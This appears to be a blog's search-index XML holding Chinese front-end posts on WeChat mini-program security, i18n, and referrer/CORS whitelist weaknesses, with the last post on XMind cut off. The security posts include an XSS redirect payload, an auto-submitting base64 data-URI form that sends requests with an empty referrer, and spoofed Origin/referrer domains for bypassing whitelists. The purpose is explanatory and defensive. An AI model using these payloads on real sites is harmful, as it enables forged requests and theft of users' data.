<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>「 微信开发 」深入分析微信小程序安全与管控</title>
      <link href="/2019/04/24/wechat_security/"/>
      <url>/2019/04/24/wechat_security/</url>
      
        <content type="html"><![CDATA[<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>写了那么多小程序，你思考过小程序的安全问题么？</p><p>为什么小程序支持跨域？</p><p>小程序中有xss，crsf攻击吗？</p><p>为什么小程序只支持request cookie，不支持response set cookie呢？</p><p>为什么小程序不支持动态加载js？什么叫动态加载js？eval和new Function有什么可怕之处？</p><p>真的没有绕过小程序审核热更新的方法吗？</p><p>小程序的登录设计有哪些安全考虑？</p><p>可以肉眼区分一个页面是小程序还是web-view吗？</p><p>今天我们就来深入理解小程序的安全设计和管控。</p><p>先限定下范围，虽然头条小程序，支付宝小程序，QQ小程序层出不穷，但本文主要从微信小程序说起。</p><p>小程序中也支持web-view，内嵌网页这类不在本文讨论范围之中，因为和浏览器是一样的，还是不支持跨域，会有XSS等。<br><a id="more"></a></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><strong>为什么小程序支持跨域？</strong></p><p>我通常和后端小伙伴这样解释，我们可以理解小程序是类似native的，所以不需要考虑跨域问题。</p><p>再解释清楚一点就是：小程序的网络请求是通过native的能力来中转后发出的，而不是直接在webview中发出的。</p><p>那我们再思考下，<strong>为什么native支持跨域而前端限制那么多？</strong></p><p>个人感觉原因如下：</p><p>1.因为前端代码是裸奔状态，用户（或者坏人）输入网址后F12就可以一览无余你的源码，而客户端的代码是编译好的，没那么容易被反编译，看清源码，所以webpack打包会生成source map，上线时最好删掉source map文件，否则坏人轻轻松松就能get到你的源码。</p><p>2.了解源码之后，前端代码存在各种被注入的可能性，一不小心就location.href到别的页面，一不小心就document.cookie获取走了cookie，或者给你做个假的登录页窃取你的密码，可以参照文章：<a href="https://www.evacoder.com/2019/02/15/iframe_security/" target="_blank" rel="noopener">万物皆可hook</a></p><p>3.浏览器tab页的存在，用户身份通常通过cookie来存储，即使tab页之间没有关系，坏人页面依然有办法窃取你的cookie。攻击形式太多样了，非常需要同源策略（跨域）的限制。</p><p>既然说到了cookie，小程序中有个重要的限制就是<strong>request中可以支持cookie但是response中不支持cookie</strong>，这又是什么考虑呢？</p><p>我们知道，在浏览器中发出请求时会自动携带该域名下的cookie，同域名的js，img，css请求都会带上cookie，但是因为小程序的网络请求是通过native来转发的，并不是之前常用的AJAX，小程序语法中我们必须手动在header中设置cookie。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wx.request(&#123;</span><br><span class="line">  method: <span class="string">'GET'</span>,</span><br><span class="line">  url: <span class="string">'evacoder.com/users'</span>,</span><br><span class="line">  data: &#123;&#125;,</span><br><span class="line">  header: &#123;</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="comment">// 设置cookie</span></span><br><span class="line">    <span class="string">'cookie'</span>: <span class="string">'userId=12345'</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>请求是native代为转发，那接受响应的实际是native，经过处理后再传递给webview，wx.request成功回调中没有返回cookie，小程序也直接禁用了DOM，BOM相关的所有方法，document.cookie根本无法调用，微信爸爸不提供cookie的返回咱也没办法。</p><p>发送cookie必须手动设置，获取不到document.cookie以及响应中的cookie，小程序中应该是<strong>不存在CSRF</strong>了。</p><p>当然还有更严格的限制，<strong>要调用某域名的接口必须在该域名下放校验文件</strong>，所以不经过同意别人的小程序没法调用你的接口，在你的小程序坏人也没法把窃取到的信息发到他的域名。</p><p><strong>小程序是否存在xss呢？</strong></p><p>xss即js代码注入，前端要做的是不信任任何用户的输入，将所有的特殊字符如&lt;&gt;/%都进行过滤，尽量不要使用eval，innerHTML。比如在博客留言中留下<code>&lt;script&gt;location.href=&#39;https://badman.com&#39;&lt;/script&gt;</code>后，这样每个访问这个页面的人都会被导流到坏人的页面（或者被窃取cookie等造成损失）。</p><p>我觉得总会有些小白不过滤吧，试了几个没啥用户的个人小程序，填写<code>&lt;script&gt;location.href=&#39;https://badman.com&#39;&lt;/script&gt;</code>果然可以提交成功，但重新进入这个页面并没有跳转到badman页面。</p><p>小程序最终也是编译成了html，DOM中的&lt;script&gt;确确实实是存在的，难道有啥奇妙之处？</p><p>其实原因很简单，数据绑定模版语法大多类似，框架将我们写的<code></code>展示在页面中是通过<strong>innerText而不是innerHTML</strong>，所以即使没有过滤也依然无法注入成功。</p><p>但是还是要注意，小程序中如果忘记过滤特殊字符，<strong>在网页中接口返回后XSS就可以成功了</strong>，这就是所谓的<strong>存储型XSS</strong>，有时候小程序上线求快，可能会防范比较薄弱，所以前后端都要好好过滤（最重要的当然是后端过滤）。</p><p>前面说到使用了innerText而未使用innerHTML，博客评论及论坛帖子这种富文本编辑器因为使用了innerHTML所以一向是xss的重灾区，在小程序中呢？</p><p>小程序中也提供了富文本 <a href="https://developers.weixin.qq.com/miniprogram/dev/component/rich-text.html" target="_blank" rel="noopener">rich-text组件</a>，但是明确规定了只接受受信任的标签，当然是没有<code>&lt;script&gt;</code>的。</p><p>但是极端一点如果小白把用户的输入eval了怎么办呢？</p><p>不用担心，小程序也<strong>不支持eval和new Function动态加载</strong>。</p><p>其实当然不是为了防止小白犯傻，更重要的是为了防止有人热更新动态加载，绕过审核，整个小程序是个壳，通过请求来返回非法内容把小程序改的面目全非。但是看到这篇 <a href="https://zhuanlan.zhihu.com/p/34191831" target="_blank" rel="noopener">懂编译原理真的可以为所欲为</a> 貌似还是有方法可以绕过，但是一般开发者暂时不会这么做，暂时没有仔细研究。</p><p>就目前来看，常见的xss已经被封死，可能还有没想到的欢迎评论补充。</p><p><strong>有办法肉眼区分一个页面是小程序还是web-view吗?</strong></p><p>可能网页在性能差的手机上渲染的慢一点，不要提肉眼区分，服务端都没有好办法直接判断。因为iOS的UA不规范，根本无法区分是小程序还是微信的浏览器。（所以说一开始多花点时间讨论再开工，不然要累死客服啊），请大家补充。</p><p><strong>小程序编译完之后变成了什么？</strong></p><p>编写小程序是使用类似HTML，JS，CSS的WXML，WXSS，JS来编写的，因为RN不稳定等原因，小程序最终没有选择类似RN的采用客户端native渲染，而是采用了Web技术渲染，加上原生接口来提供原生能力，所以小程序最终还是打包成HTML运行在浏览器中。因为浏览器不识别小程序语言，所以需要一个编译过程，大概理解起来就相当于有wxml-loader，wxss-loader通过webpack打包成pp-service.js后，插入在一个page-frame的html中。</p><p>我们可以抓包看到小程序的refer是<a href="https://servicewechat.com/{APPID}/{VERSION}/page-frame.html。" target="_blank" rel="noopener">https://servicewechat.com/{APPID}/{VERSION}/page-frame.html。</a></p><p>小程序的写法和vue相似，但是vue中js，html，css可以写在一个vue文件中，但是小程序中必须拆分为三个文件，会不会有些多余呢？</p><p>实际上这正是小程序的安全设计的用心之处，<strong>区分视图层和逻辑层，采用双线程的设计</strong>。（其实也可以一个页面，编译时做拆分即可，不过三个文件也更灵活）。</p><p>官方提供的编译过程</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 【WXML】编译后得到以下函数，根据路径和数据自动生成virtualDom，然后通过组件系统比对差异渲染页面</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$gwx</span>(<span class="params">pagePath</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">pageData</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据页面路径获取页面结构生成函数</span></span><br><span class="line"><span class="keyword">var</span> generateFun = $gwx(<span class="string">'name.wxml'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面结构生成函数从【js】接受页面数据，得到描述页面结构的JSON</span></span><br><span class="line"><span class="keyword">var</span> virtualTree = generateFun(&#123;</span><br><span class="line">  name: <span class="string">'Eva'</span>,</span><br><span class="line">  age: <span class="string">'6'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* virtualTree == &#123;</span></span><br><span class="line"><span class="comment">  tag: 'view'，</span></span><br><span class="line"><span class="comment">  children: [&#123;</span></span><br><span class="line"><span class="comment">    tag: 'view',</span></span><br><span class="line"><span class="comment">    children: ['name:Eva', 'age:6']</span></span><br><span class="line"><span class="comment">  &#125;]</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 小程序组件系统在虚拟树对比后将结果渲染到页面上</span></span><br><span class="line">virtualDom.render(virtualTree)</span><br></pre></td></tr></table></figure><p>视图层通过WebView浏览器环境，逻辑层通过JsCore来执行。</p><p><strong>视图层</strong>包括WXML和WXSS，使用<strong>WebView</strong>加载page-frame.html，在确定页面路径之后，WXML和WXSS文件生成了JS函数generateFun，结合逻辑层的页面数据得到virtualTree，小程序组件系统在虚拟树对比后将结果渲染到页面上。</p><p><strong>逻辑层</strong>中包括所有JS代码，主要是页面的数据，和点击事件等处理，所有JS编译成appService.js。</p><p>逻辑层和视图层常见的三种交互情况：</p><p>初次渲染：逻辑层将pageData和pagePath等通过Native传给视图层来渲染页面。</p><p>更新数据：逻辑层发送数据给视图层</p><p>用户事件：视图层收到用户事件根据绑定事件回调函数来反馈给逻辑层</p><p>为啥要区分逻辑层和视图层呢？</p><blockquote><p>基于Web 技术来渲染小程序是存在一些不可控因素和安全风险的。这是因为Web技术是非常开放灵活的，我们可以利用JavaScript 脚本随意地跳转网页或者改变界面上的任意内容。</p></blockquote><p>开发者可以做的事太多了，比如现在用户授权必须用户手动点按钮，但是如果可以DOM操作开发者直接就能跳过这一步获取用户敏感信息了。而且会存在前面提到的很多的安全隐患。</p><p>逻辑层使用的JsCore只是一个单纯的脚本解析器，浏览器中的BOM对象无法使用，正好可以完美解决这个问题。开发者工具并不是使用了真正的JSCore，而是直接用一个webview，有个很巧妙的设计，将开发者的代码包裹在define域的时候，<strong>将浏览器的BOM对象局部变量化</strong>，从而使得在开发阶段就能发现问题。</p><p>如果在渲染层写了script代码，在webpack处理时因为不符合规范应该会直接被过滤，或者会报错无法执行。</p><p>如果在逻辑层写了操作DOM的方法，因为JSCore环境下不识别，所以也会报错。</p><h4 id="官方论证"><a href="#官方论证" class="headerlink" title="官方论证"></a>官方论证</h4><p>其实上面的问题官方都公布了答案：<a href="https://developers.weixin.qq.com/ebook?action=get_post_info&amp;token=935589521&amp;volumn=1&amp;lang=zh_CN&amp;book=miniprogram&amp;docid=000e84889907c00b0086b0a2f5b40a" target="_blank" rel="noopener">深入理解小程序架构</a>。</p><p>这里真的有很多宝藏，快去探索吧。</p><p>通过上文的分析，小程序通过这些限制来保证了安全和管控：</p><p>1.逻辑层和渲染层的双线程架构</p><p>2.不支持eval和new Function动态加载</p><p>3.请求域名校验</p><p>这篇文章的篇幅已经很长了，关于小程序的登录安全设计，我们将在下篇文章中介绍。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 微信开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 功能点 」国际化的一些思考和注意事项</title>
      <link href="/2019/04/18/i18n_thinking/"/>
      <url>/2019/04/18/i18n_thinking/</url>
      
        <content type="html"><![CDATA[<p>从后端国际化转向了使用vue-i18n前端国际化，不再会出现因为资源缺失导致的service error了，近期又全面整理了下国际化中踩过的坑，分享给大家。<br><a id="more"></a></p><h3 id="和翻译同学的合作"><a href="#和翻译同学的合作" class="headerlink" title="和翻译同学的合作"></a>和翻译同学的合作</h3><p>翻译同学一般使用 <a href="https://crowdin.com" target="_blank" rel="noopener">https://crowdin.com</a> 来提交翻译，在crowdin提交之后会有脚本定时提交到gitlab的语言资源项目中，开发同学可以通过脚本将语言资源copy到自己的实际项目中，但是要注意需要等翻译<strong>100%</strong>完成时才进行copy，不然会混杂着未翻译的文案给用户造成困扰。</p><p>和翻译同学合作需要注意以下几点：</p><h4 id="1-注意尽量不要使用拼接的字符串"><a href="#1-注意尽量不要使用拼接的字符串" class="headerlink" title="1.注意尽量不要使用拼接的字符串"></a>1.注意尽量不要使用拼接的字符串</h4><p>比如：</p><p>tips=请同意隐私政策和用户协议</p><p>千万不要因为用户协议和隐私政策需要在多处用到，就将字符串切分为多个：</p><p>agreement=用户协议</p><p>privacy=隐私政策</p><p>notice=请同意</p><p>and=和</p><p>这样翻译同学会和莫名其妙，而且不同语言因为语序不一样，我们生硬的组合起来，展示在网页上的整句话会完全不可读。</p><h4 id="2-注意单复数的处理"><a href="#2-注意单复数的处理" class="headerlink" title="2.注意单复数的处理"></a>2.注意单复数的处理</h4><p>left_times=您还能发送{n}条短信</p><p>在其他语言中会有单复数的区分，1 message left，2 messages left。 在阿语中单复数的表达甚至有多达6种。 Android的resource是使用xml，处理单复数如下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plurals</span> <span class="attr">name</span>=<span class="string">"watch_face_count"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">item</span> <span class="attr">quantity</span>=<span class="string">"one"</span>&gt;</span>%1$d个手盘<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">item</span> <span class="attr">quantity</span>=<span class="string">"other"</span>&gt;</span>%1$d个手盘<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plurals</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>Web中暂时没有比较好的处理方法</p><h4 id="3-需要注意日期，金额等格式差异的处理"><a href="#3-需要注意日期，金额等格式差异的处理" class="headerlink" title="3.需要注意日期，金额等格式差异的处理"></a>3.需要注意日期，金额等格式差异的处理</h4><p>比如在中文中通常是年月日格式：2019-05-13，英语中日期格式是日月年 13-05-2019</p><h4 id="4-需要注意rtl语言的特殊ui处理"><a href="#4-需要注意rtl语言的特殊ui处理" class="headerlink" title="4.需要注意rtl语言的特殊ui处理"></a>4.需要注意rtl语言的特殊ui处理</h4><p>有很多语言，比如iw_IL，ar等语言习惯都是从左到右的书写习惯，此时除了需要加上 <code>body{direction:rtl}</code></p><p>其他的布局也需要注意将left和right互换。</p><h4 id="5-需要注意语言中单双引号的处理"><a href="#5-需要注意语言中单双引号的处理" class="headerlink" title="5.需要注意语言中单双引号的处理"></a>5.需要注意语言中单双引号的处理</h4><p>英语en_US，法语fr_FR，意大利语it_IT有单引号，iw_IL希伯来语中有双引号作为字符。</p><p>如果出现在js的字符串中，导致语法错误，程序直接无法运行，此时我们需要用上转义字符来避免问题。</p><p>写个脚本统一将单双引号进行html转译</p><table><thead><tr><th style="text-align:left">Character</th><th style="text-align:left">转义后</th></tr></thead><tbody><tr><td style="text-align:left"><code>&#39;</code></td><td style="text-align:left"><code>&amp;#39;</code>（因为 <code>&amp;apos;</code> 不兼容IE所以使用这个）</td></tr><tr><td style="text-align:left"><code>&quot;</code></td><td style="text-align:left"><code>&amp;quot;</code></td></tr></tbody></table><h4 id="6-需要注意某些语言过长的处理"><a href="#6-需要注意某些语言过长的处理" class="headerlink" title="6.需要注意某些语言过长的处理"></a>6.需要注意某些语言过长的处理</h4><p>有些语言，比如 <code>mr_IR</code> 一个单词就非常长，所以一点要做好超长的样式处理，能够做到自适应布局。</p><h3 id="对外提供页面原则"><a href="#对外提供页面原则" class="headerlink" title="对外提供页面原则"></a>对外提供页面原则</h3><p>国际化的实现通常有两种方案：</p><p>1.将每个语言打包成一个页面（index-en_US.html,index-fr_FR.html）</p><ul><li>通常使用在对于性能和白屏时间有要求的网站首页，采用后端渲染根据对应的语言去加载</li><li>或者每个语言的差异比较大，不能通过模版语法简单的key-value对应上</li></ul><p>2.同一个页面，根据_locale参数或cookie加载不同的语言包(en_US.json,fr_FR.json)</p><p>无论使用哪种方式，因为我们对外提供的页面需要被别的页面引用，<strong>不应该让每个引用的页面来处理语言和页面对应逻辑</strong>，即不应该直接提供zh_CN.html，en_US.html这样的路径，而应该提供一个中间页面index.html，有的locale并不能自动对应locale.html,需要作为页面提供者的我们根据参数_locale=${locale}或者cookie来自动跳转对应的语言版本统一处理。</p><h3 id="vue-i18n使用"><a href="#vue-i18n使用" class="headerlink" title="vue-i18n使用"></a>vue-i18n使用</h3><p><a href="https://kazupon.github.io/vue-i18n/zh/introduction.html" target="_blank" rel="noopener">Vue-i18n 文档</a> 已经很清楚而且现在也有翻译了，不再赘述，需要注意使用webpack延迟加载而不是直接加载全部。</p><p>一般情况下都是前端来维护国际化的资源文件，确实是一件费时费力枯燥无味的工作，但是在工作中切忌眼高手低，分配到你的工作一定要做好。随着业务发展，需要支持的语言的种类越来越多，为了方便维护，最开始就要考虑好上面的问题的解决方案。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 功能点 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 安全 」从 referrer 白名单说到CORS攻击点</title>
      <link href="/2019/03/19/refer_cors_sec/"/>
      <url>/2019/03/19/refer_cors_sec/</url>
      
        <content type="html"><![CDATA[<p>看到一个抢红包的活动页，准备把接口copy出来自动测试却发现403了，这种情况一般都是因为有 <code>referrer</code> 校验。我们也经常会通过 <code>referrer</code> 白名单来限制接口的盗用，今天来分析下可能存在的攻击点。</p><a id="more"></a><h4 id="referrer-为空的情况"><a href="#referrer-为空的情况" class="headerlink" title="referrer 为空的情况"></a><code>referrer</code> 为空的情况</h4><p> <code>referrer</code> 本来的作用是判断当前页面的来源页面的地址，通常用来统计分析，日志记录，或者可以记录下帮别人导流数量来收钱，但是在页面跳转中也存在没有  <code>referrer</code>  的的几种情况：</p><p>1.来源页面采用的协议为表示本地文件的 <code>file</code> 或者 <code>data</code> URI</p><p>2.当前请求页面采用的是非安全协议，而来源页面采用的是安全协议(HTTPS跳到HTTP)</p><p>3.直接在浏览器地址输入地址进入的页面，或<code>location.reload()</code>刷新会没有 <code>referrer</code> ，<code>location.href</code>或者<code>location.replace()</code> 有 <code>referrer</code> </p><p>4.代码设置禁止发送：<code>&lt;a rel=&quot;noreferrer&quot; href=&quot;https://evacoder.com/users&quot;&gt;</code>，<code>&lt;meta content=&quot;never&quot; name=&quot;referrer&quot;&gt;</code></p><p>前端虽然可以通过 <code>document.referrer</code> 获取 <code>referrer</code> ，但为了安全JS是无法修改 <code>referrer</code> 的。</p><p>那是否还有可攻击点呢？</p><p>当然！如果要进行 <code>referrer</code> 校验，有的接口因为需要客户端通用，考虑到客户端请求不带 <code>referrer</code> ，server端有时会放过 <code>referrer</code> 为空的情况，这个时候坏人就可以利用上面的规则构造出 <code>referrer</code> 为空的情况。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg=="</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>base64解码下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">atob(<span class="string">'PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg=='</span>)</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">"&lt;form method=post action=http://a.b.com/d&gt;&lt;input type=text name='id' value='123'/&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;"</span></span><br></pre></td></tr></table></figure><p>利用上文的第1条：协议为data开头，如果这个HTML页面向任何站点提交请求的话，这些请求的 <code>referrer</code> 都是空的。</p><p>或者利用第4条，强制设置不发送  <code>referrer</code> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"never"</span> <span class="attr">name</span>=<span class="string">"referrer"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">rel</span>=<span class="string">"noreferrer"</span> <span class="attr">href</span>=<span class="string">"https://evacoder.com/users"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>既然存在作恶的空间我们就最好不要放过 <code>referrer</code> 为空的请求，对于客户端通过UA来过滤放行。</p><h4 id="referrer-的正则攻击点"><a href="#referrer-的正则攻击点" class="headerlink" title="referrer 的正则攻击点"></a><code>referrer</code> 的正则攻击点</h4><p>那不允许 <code>referrer</code> 为空就不存在安全问题了吗？ <code>referrer</code> 的校验依然有很多可绕过的地方。因为无法看到后端的 <code>referrer</code> 校验规则，我们只能碰碰运气，常见的问题如下：</p><p>如果已知在evacoder.com/demo中是可以通过 <code>referrer</code> 校验的，我们试着在抓包工具中修改 <code>referrer</code> 为以下：</p><p>1.<a href="https://www.badmanhackevacoder.com/demo" target="_blank" rel="noopener">https://www.badmanhackevacoder.com/demo</a>  （可能只校验了<code>/^.*evacoder.com/demo$/</code>）</p><p>2.<a href="https://www.evacoder.badman.com/evacoder.com/demo" target="_blank" rel="noopener">https://www.evacoder.badman.com/evacoder.com/demo</a>   (可能只校验了<code>/^.*evacoder.com/demo$/</code>,可以构造一个对应的文件夹来绕过）</p><p>3.<a href="https://badman.com?id=evacoder.com/demo" target="_blank" rel="noopener">https://badman.com?id=evacoder.com/demo</a> （构造参数）</p><h4 id="CORS中的类似攻击"><a href="#CORS中的类似攻击" class="headerlink" title="CORS中的类似攻击"></a>CORS中的类似攻击</h4><p>我们常说AJAX有跨域限制，但是很多人没有注意到即使跨域，AJAX其实也已经将请求发出去，只不过因为浏览器限制，JS获取不到响应而已，类似ping img。为了解决AJAX跨域的问题，现代我们通常使用CORS来跨域资源共享。</p><p>IE10以上都支持CORS，放心使用，只需要后端配置允许CORS，前端啥也不用改就可以直接获取到跨域的请求，我们可以视情况在IE10以下使用JSONP来兼容。</p><p>node配置示例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">'*'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 任意域名都可访问此接口，不能携带cookie</span></span><br><span class="line">  res.header(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'*'</span>);</span><br><span class="line">  <span class="comment">// res.header('Access-Control-Allow-Origin', 'http://www.baidu.com'); // 只有www.baidu.com 可以访问。</span></span><br><span class="line">  res.header(<span class="string">'Access-Control-Allow-Headers'</span>, <span class="string">'Content-Type, Content-Length, Authorization, Accept, X-Requested-With , yourHeaderFeild'</span>);</span><br><span class="line">  res.header(<span class="string">'Access-Control-Allow-Methods'</span>, <span class="string">'PUT, POST, GET, DELETE, OPTIONS'</span>);<span class="comment">// 允许的请求方法</span></span><br><span class="line">  <span class="keyword">if</span> (req.method == <span class="string">'OPTIONS'</span>) &#123;</span><br><span class="line">    res.send(<span class="number">200</span>); <span class="comment">// 在正常的请求之前，会发送一个验证，是否可以请求。</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面说到 <code>referrer</code> 因为正则校验不严格，所以容易出现可以绕过的问题，在CORS中一样存在。</p><p>对于CORS为*的，我们不必关心，它已经放弃了限制，你随便来调用吧，要是有笨到将敏感接口如此设置的，应该会被直接开除吧。</p><p>但是假设我们F12突然发现 <a href="https://www.evacoder.com" target="_blank" rel="noopener">https://www.evacoder.com</a> 中有个接口居然设置了CORS，</p><p>CORS请求成功之后，在response header中会有以下请求头，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Response Header</span><br><span class="line">Origin: https://www.evacoder.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Allow-Headers: Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,token</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS</span><br><span class="line">Access-Control-Allow-Origin: https://www.evacoder.com</span><br></pre></td></tr></table></figure><p>这里的CORS只在指定的某些域名可以使用，同样仅在前端是看不出来在后端设置的具体域名的。</p><p>我们来碰碰运气，在抓包工具中修改Origin为以下：</p><p>1.<a href="https://www.badmanhackevacoder.com" target="_blank" rel="noopener">https://www.badmanhackevacoder.com</a> （可能只校验了<code>/^.\*evacoder.com$/</code>）</p><p>2.<a href="https://www.evacoder.badman.com" target="_blank" rel="noopener">https://www.evacoder.badman.com</a> (可能只校验了<code>/^.\*evacoder..\*.com$/</code>）</p><p>去测试吧，可能会碰到漏网之小白，再找到敏感接口，将 <a href="https://www.badmanhackevacoder.com/testPage" target="_blank" rel="noopener">https://www.badmanhackevacoder.com/testPage</a> 发给用户，用户可能已经登录过evacoder.com，坏人页请求敏感接口成功，就能获取到小白在evacoder的敏感信息了。</p><p>CORS可攻击点的范围比 <code>referrer</code> 要稍小一点，CORS只能构造假的domain， <code>referrer</code>  还可以构造参数，可发挥的空间更大。</p><p>虽然一般是server端referer和CORS白名单，但是作为对浏览器最了解的前端，为server端提供安全建议也是我们应该做的哦~</p><p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">CORS详细介绍</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 工具 」绘图工具指南</title>
      <link href="/2019/03/18/xmind/"/>
      <url>/2019/03/18/xmind/</url>
      
        <content type="html"><![CDATA[<p>除了写出高性能的算法，面对复杂的业务逻辑，画出清晰的mind map 往往会达到事半功倍的效果。<br><a id="more"></a></p><h4 id="绘图工具"><a href="#绘图工具" class="headerlink" title="绘图工具"></a>绘图工具</h4><p>调研了下一般后端小伙伴使用 Office 的 visual 来绘图，也有使用chrome的gliffy在线就可以画图</p><p>用mac的PM用sketch画图</p><p>测试同学用XMind来画分支图</p><p>个人感觉还是XMind更清晰美观，今天系统的感受了下xmind，记录下如何画出清晰美丽的mind map。</p><h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><p>基本掌握三个快捷键就可以开始画图了</p><p>tab添加子主题</p><p>enter添加同级主题</p><p>space进入编辑状态</p><h4 id="模版风格"><a href="#模版风格" class="headerlink" 